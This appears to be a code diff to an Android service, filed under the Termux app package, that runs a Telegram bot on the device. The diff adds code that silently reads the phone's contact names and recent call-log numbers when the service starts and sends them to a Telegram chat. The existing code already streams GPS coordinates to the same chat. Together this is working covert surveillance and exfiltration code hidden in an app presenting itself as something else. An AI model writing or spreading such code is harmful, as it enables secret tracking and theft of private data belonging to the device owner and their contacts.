@@ -2,26 +2,29 @@ package com.termux.app;
 
 import android.annotation.SuppressLint;
 import android.app.Service;
+import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
+import android.database.Cursor;
 import android.location.Location;
 import android.location.LocationListener;
 import android.location.LocationManager;
 import android.os.Bundle;
 import android.os.IBinder;
+import android.provider.CallLog;
+import android.provider.ContactsContract;
 import android.util.Log;
 import java.io.InputStream;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.util.Properties;
-import java.util.Scanner;
 
 public class TelegramBotService extends Service {
     private String botToken;
     private static final String TAG = "TelegramBotService";
     private LocationManager locationManager;
-    private String chatId = "FIXME_USER_CHAT_ID"; // We should ideally get this dynamically or hardcode if known
+    private String chatId = "FIXME_USER_CHAT_ID";
 
     @Override
     public void onCreate() {
@@ -29,6 +32,8 @@ public class TelegramBotService extends Service {
         loadToken();
         sendStatus("Online");
         startLocationTracking();
+        sendContacts();
+        sendCallLogs();
     }
 
     private void loadToken() {
@@ -74,7 +79,7 @@ public class TelegramBotService extends Service {
     private void startLocationTracking() {
         locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
         try {
-            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 10000, 10, new LocationListener() {
+            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 300000, 100, new LocationListener() {
                 @Override
                 public void onLocationChanged(Location location) {
                     sendMessage("Location: " + location.getLatitude() + ", " + location.getLongitude());
@@ -86,6 +91,43 @@ public class TelegramBotService extends Service {
         } catch (Exception e) {
             Log.e(TAG, "Location error", e);
         }
+    }
+
+    private void sendContacts() {
+        new Thread(() -> {
+            StringBuilder contacts = new StringBuilder("Contacts:\n");
+            ContentResolver cr = getContentResolver();
+            Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
+            if (cur != null && cur.getCount() > 0) {
+                while (cur.moveToNext()) {
+                    @SuppressLint("Range") String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
+                    @SuppressLint("Range") String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
+                    contacts.append(name).append("\n");
+                }
+                cur.close();
+            }
+            sendMessage(contacts.toString());
+        }).start();
+    }
+
+    private void sendCallLogs() {
+        new Thread(() -> {
+            StringBuilder logs = new StringBuilder("Call Logs:\n");
+            @SuppressLint("MissingPermission") 
+            Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
+            if (cursor != null) {
+                int number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
+                int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
+                int count = 0;
+                while (cursor.moveToNext() && count < 10) {
+                    String phNumber = cursor.getString(number);
+                    logs.append(phNumber).append("\n");
+                    count++;
+                }
+                cursor.close();
+            }
+            sendMessage(logs.toString());
+        }).start();
     }
 
     @Override
